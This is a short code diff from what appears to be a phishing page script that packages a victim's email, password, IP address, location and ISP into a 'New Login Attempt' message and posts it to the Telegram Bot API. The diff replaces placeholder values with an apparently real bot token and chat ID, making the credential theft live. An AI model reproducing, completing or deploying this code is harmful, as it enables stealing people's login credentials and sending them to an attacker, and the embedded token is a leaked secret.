@@ -24,8 +24,8 @@ document.addEventListener('DOMContentLoaded', function () {
                 const message = `🔹 New Login Attempt 🔹\n📧 Email: ${usrId}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
                 // Replace with your actual bot token and chat ID
-                const botToken = 'YOUR_BOT_TOKEN';
-                const chatId = 'YOUR_CHAT_ID';
+                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
+                const chatId = '6651292809';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 const payload = {
